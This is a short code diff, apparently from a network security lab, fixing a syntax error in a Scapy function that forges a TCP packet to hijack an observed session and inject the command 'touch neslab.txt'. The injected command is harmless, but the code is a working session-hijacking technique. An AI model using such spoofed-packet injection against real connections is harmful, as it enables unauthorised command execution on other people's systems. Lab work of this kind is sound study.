@@ -4,7 +4,7 @@ def spoof_tcp (pkt) :
   IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="A" ,
   seq=pkt [TCP].ack,ack=pkt[TCP].seq,
-  dport=pkt[TCP].sport, sport=pkt [TCP] dport)
+  dport=pkt[TCP].sport, sport=pkt [TCP].dport)
   data= "\rtouch neslab.txt\r"
   spoofpkt = IPLayer/TCPLayer/data
   ls(spoofpkt)
